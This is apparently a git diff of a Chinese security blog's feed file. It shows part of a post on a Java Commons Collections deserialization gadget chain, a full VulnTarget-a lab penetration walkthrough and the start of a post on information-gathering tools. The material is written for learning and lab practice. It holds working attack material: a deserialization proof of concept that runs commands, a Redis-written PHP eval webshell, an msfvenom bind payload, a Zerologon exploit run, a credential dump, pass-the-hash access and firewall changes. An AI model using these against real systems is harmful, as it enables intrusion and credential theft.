+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424181355248-164962512.png" alt="image-20220424181354526"></p>
+<p>根据之前的分析，可以知道<code>TransformedMap</code>的触发点是put()方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">put()-&gt;transformValue()-&gt;ChainedTransformer#transform()</span><br></pre></td></tr></table></figure>
+
+<p>而<code>LazyMap</code>的触发点是在get()方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424184102740-394006463.png" alt="image-20220424184103297"></p>
+<p>get()方法的实现是首先判断map的中是否包含传入的key，当key不存在时，就会调用<code>transformerChain</code>的transform()方法。那么，我们根据这个触发点来编写如下poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">       //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       //创建Map并绑定transformerChina</span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">       </span><br><span class="line">       Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">       tmpmap.get(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行完get()方法弹出计算器</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003117682-2015149661.png" alt="image-20220425003115659"></p>
+<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类类型参数，该类是注解类，第二个是map类型参数。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003631092-1481504679.png" alt="image-20220425003629840"></p>
+<p>所有的注解类型都继承自Annotation接口</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003958204-372179627.png" alt="image-20220425003956842"></p>
+<p>查看<code>AnnotationInvocationHandler#readObject</code>方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425004348631-2058048733.png" alt="image-20220425004347242"></p>
+<p>假设这里我们通过反射调用<code>AnnotationInvocationHandler</code>，并传入两个参数，一个是<code>Retention.class</code>，另一个是<code>outerMap</code>。<code>Retention</code>是一个注解类。<code>outerMap</code>是我们<code>TransformedMap</code>修饰过的类。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class  clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(true);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>
+
+<p>这时候在 <code>AnnotationInvocationHandler</code>的<code>readObject</code>方法里面 <code>memberValues</code>就是我们使用反射传入的 <code>TransformedMap</code>的对象。代码中遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥的<code>Transform</code>方法，从而导致命令的执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">      // for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">           Object value = null;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">               Object value = memberValue.getValue();</span><br><span class="line">               value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                   value = new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">                               annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           mv.put(name, value);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        </span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                            new Class[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class &#125;, new Object[] &#123; null, new</span><br><span class="line">                            Object[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            new String[] &#123;</span><br><span class="line">                                    &quot;calc.exe&quot; &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new</span><br><span class="line">                    ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformerChain);</span><br><span class="line">            Class clazz =</span><br><span class="line">                    Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                    Map.class);</span><br><span class="line">            construct.setAccessible(true);</span><br><span class="line">            InvocationHandler handler = (InvocationHandler)</span><br><span class="line">                    construct.newInstance(Retention.class, outerMap);</span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(new</span><br><span class="line">                    ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">            Object o = (Object)ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行弹出计算器</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425014904438-114576049.png" alt="image-20220425014902982"></p>
+<p>测试过程发现，jdk1.8.0_321无法达到命令执行的目的，后面换了个jdk1.7.0_21才执行成功</p>
+<p>在高版本中的<code>AnnotationInvocationHandler</code>的<code>readObject</code>是被改动过的，如下为低版本jdk</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425015123743-612622047.png" alt="image-20220425015122452"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13791793.html">https://www.cnblogs.com/nice0e3/p/13791793.html</a></p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>cc链</tag>
       </tags>
   </entry>
   <entry>
@@ -1337,6 +1337,130 @@
       </tags>
   </entry>
   <entry>
+    <title>VulnTarget-a 靶场渗透测试</title>
+    <url>/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
+
+<h2 id="一、靶机信息"><a href="#一、靶机信息" class="headerlink" title="一、靶机信息"></a>一、靶机信息</h2><span id="more"></span>
+
+<p>网络拓扑图</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224172048276-1349065730.png" alt="image-20220224172048057"></p>
+<p>攻击机：kali-192.168.12.128</p>
+<p>win7：账号：win7；密码：admin</p>
+<p>win-2016：账号：Administrator；密码：Admin@123</p>
+<p>win-2019:账号：administrator；密码：Admin@666</p>
+<p>靶场下载地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/195iUmvbaKOhtn2S_O-F6TA 提取码: jnkq</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p><code>nmap</code>扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -A 192.168.12.136 </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:20 EST</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         nginx</span><br><span class="line">|_http-title: \xCD\xA8\xB4\xEFOA\xCD\xF8\xC2\xE7\xD6\xC7\xC4\xDC\xB0\xEC\xB9\xAB\xCF\xB5\xCD\xB3</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows Vista|2008|7</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7</span><br><span class="line">OS details: Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: WIN7-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: win7-PC</span><br><span class="line">|   NetBIOS computer name: WIN7-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-02-24T16:20:29+08:00</span><br><span class="line">|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: WIN7-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b6:97:9f (VMware)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-02-24T08:20:29</span><br><span class="line">|_  start_date: 2022-02-24T07:19:44</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.77 ms 192.168.12.136</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.05 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据扫描的结果，得知win7开启了SMB服务，可能存在ms1-7010，用nmap进行漏洞扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln 192.168.12.136 -p 445,139,135 -T4 -v </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:46 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 10.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 03:46, 0.06s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 03:46</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 03:46, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [3 ports]</span><br><span class="line">Discovered open port 139/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 445/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 135/tcp on 192.168.12.136</span><br><span class="line">Completed SYN Stealth Scan at 03:46, 1.14s elapsed (3 total ports)</span><br><span class="line">NSE: Script scanning 192.168.12.136.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 14.99s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds</span><br><span class="line">           Raw packets sent: 6 (248B) | Rcvd: 4 (160B)</span><br></pre></td></tr></table></figure>
+
+<p>扫出存在ms17-010，且80端口开启了http服务</p>
+<h2 id="三、通达OA-Getshell"><a href="#三、通达OA-Getshell" class="headerlink" title="三、通达OA-Getshell"></a>三、通达OA-Getshell</h2><p>访问80端口，是一个通达OA系统</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180349959-1667979959.png" alt="image-20220224180348215"></p>
+<p>直接上通达OA综合利用工具</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180450264-1792432834.png" alt="image-20220224180450014"></p>
+<p>上传webshell，后使用蚁剑相连</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224190238933-863110053.png" alt="image-20220224190238677"></p>
+<h2 id="四、ms17-010"><a href="#四、ms17-010" class="headerlink" title="四、ms17-010"></a>四、ms17-010</h2><p>使用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue，设置好ip</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110354482-370777190.png" alt="image-20220225110354133"></p>
+<p>获取密码</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110621623-777957063.png" alt="image-20220225110622088"></p>
+<p>发现内网网段</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110725843-1000787767.png" alt="image-20220225110726376"></p>
+<p>进程迁移 run post&#x2F;windows&#x2F;manage&#x2F;migrate </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111356795-1313355061.png" alt="image-20220225111357560"></p>
+<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111701747-1624666354.png" alt="image-20220225111702604"></p>
+<p>扫描另一个网段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set ports 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">ports =&gt; 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 10.0.20.0/24</span><br><span class="line">rhosts =&gt; 10.0.20.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225112650421-901340987.png" alt="image-20220225112650988"></p>
+<p>设置代理 use auxiliary&#x2F;server&#x2F;socks_proxy</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225114131297-1320655720.png" alt="image-20220225114131843"></p>
+<p>扫描目录发现phpinfo.php，访问得到网站的绝对路径 C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132259717-246697551.png" alt="image-20220225132300461"></p>
+<h2 id="五、Redis未授权"><a href="#五、Redis未授权" class="headerlink" title="五、Redis未授权"></a>五、Redis未授权</h2><p>根据前面端口扫描的结果，发现10.0.20.99开放6379端口，为redis服务，连接redis服务端</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132358885-169890561.png" alt="image-20220225132359703"></p>
+<p>前面知道了web的绝对路径，就可以尝试写webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set 1 &quot;&lt;?php @eval($_POST[&#x27;xt&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132545506-441461470.png" alt="image-20220225132546411"></p>
+<p>成功写入</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132627451-134243051.png" alt="image-20220225132628431"></p>
+<p>配置蚁剑的代理</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132918058-500776476.png" alt="image-20220225132918931"></p>
+<p>连接webshell</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132954621-1024961877.png" alt="image-20220225132955428"></p>
+<p>发现另一个内网IP10.0.10.111</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225133312093-1879231647.png" alt="image-20220225133311482"></p>
+<p>上线msf </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8090 -f exe &gt; bind_8090.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225141445075-1184723408.png" alt="image-20220225141444539"></p>
+<p>通过蚂剑上传exe</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145547529-1362028343.png" alt="image-20220225145546791"></p>
+<p>msf设置监听</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145657518-2077326036.png" alt="image-20220225145656812"></p>
+<p>关闭防火墙</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145724406-1568966848.png" alt="image-20220225145724001"></p>
+<p>运行exe，可以看到上线msf成功</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145805889-782803992.png" alt="image-20220225145805449"></p>
+<p>加载kiwi，进行进程迁移</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145925039-1401644437.png" alt="image-20220225145924483"></p>
+<p>查看HTLM</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150027820-1217638930.png" alt="image-20220225150027261"></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150132856-1497488849.png" alt="image-20220225150132278"></p>
+<p>破解密码，得知win2016的密码为Admin@123</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150258857-904011230.png" alt="image-20220225150258263"></p>
+<p>查看域控制器计算机名</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150517118-936221546.png" alt="image-20220225150516700"></p>
+<p>查看域管理员</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150543950-1336172595.png" alt="image-20220225150543586"></p>
+<p>得到域控制器的IP为10.0.10.110</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150618111-137306728.png" alt="image-20220225150617712"></p>
+<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150721610-1227593958.png" alt="image-20220225150721108"></p>
+<h2 id="六、CVE-2020-1472提权"><a href="#六、CVE-2020-1472提权" class="headerlink" title="六、CVE-2020-1472提权"></a>六、CVE-2020-1472提权</h2><p>因为拿到的是域普通用户的权限，直接上1472</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152834006-1262917074.png" alt="image-20220225152833403"></p>
+<p>此时密码已置空</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python secretsdump.py  vulntarget.com/WIN2019\$@10.0.10.110  -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152850109-4254443.png" alt="image-20220225152849412"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p>成功访问域控</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225153425556-447460473.png" alt="image-20220225153424916"></p>
+<p>破解hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/nmap/nselib/data/passwords.lst hash.txt --format=NT</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154241871-1129294273.png" alt="image-20220225154241357"></p>
+<p>开启远程桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154445468-1141645458.png" alt="image-20220225154444872"></p>
+<p>上线msf，先关闭防火墙策略</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;bind tcp&quot; protocol=TCP dir=in localport=8090 action=allow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155030667-1311091733.png" alt="image-20220225155030184"></p>
+<p>运行exe，上线成功</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155107644-2051212924.png" alt="image-20220225155107107"></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155139792-2008698039.png" alt="image-20220225155139347"></p>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE漏洞学习</title>
     <url>/2022/03/21/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer"/>
@@ -1530,127 +1654,138 @@
       </tags>
   </entry>
   <entry>
-    <title>VulnTarget-a 靶场渗透测试</title>
-    <url>/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <title>常用的信息收集工具</title>
+    <url>/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer"/>
 
-<h2 id="一、靶机信息"><a href="#一、靶机信息" class="headerlink" title="一、靶机信息"></a>一、靶机信息</h2><span id="more"></span>
+<h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><h4 id="爱站、站长工具"><a href="#爱站、站长工具" class="headerlink" title="爱站、站长工具"></a>爱站、站长工具</h4><p>SEO综合查询：根据域名来收集目标站点的备案信息、名称、注册人等信息</p>
+<span id="more"></span>
 
-<p>网络拓扑图</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224172048276-1349065730.png" alt="image-20220224172048057"></p>
-<p>攻击机：kali-192.168.12.128</p>
-<p>win7：账号：win7；密码：admin</p>
-<p>win-2016：账号：Administrator；密码：Admin@123</p>
-<p>win-2019:账号：administrator；密码：Admin@666</p>
-<p>靶场下载地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/195iUmvbaKOhtn2S_O-F6TA 提取码: jnkq</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331234824808-1321230515.png" alt="image-20220331234824770"></p>
+<p>ICP备案查询：可以查询该单位备案的其它网站</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235548245-1513379625.png" alt="image-20220331235548490"></p>
+<p>Whois查询：可以通过域名、邮箱、注册人查询目标信息，或者通过Whois反查获取更多的信息</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235812621-1264700791.png" alt="image-20220331235812791"></p>
